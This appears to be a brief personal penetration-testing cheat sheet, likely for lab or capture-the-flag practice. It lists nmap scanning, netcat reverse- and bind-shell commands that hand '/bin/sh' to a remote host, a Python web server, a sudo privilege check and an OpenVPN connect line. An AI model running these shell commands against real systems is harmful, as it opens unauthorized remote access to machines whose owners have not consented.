# NMAP
nmap -T4 -p -A <ip>

# Netcat 
## Reverse Shell
### Attacker Listener
nc -nlvp 4444

### Tareget Connecting
nc 192.168.1.2 4444 -e /bin/sh

## Bind Shell
### Attacker Connecting
nc 192.168.1.2 4444

### Target Listener
nc -nvlp 4444 -e /bin/sh

# Python Webserver
python3 -m http.server <port>

# Privilege Escalation Check
sudo -l

# OpenVPN
sudo openvpn <file>.vpn




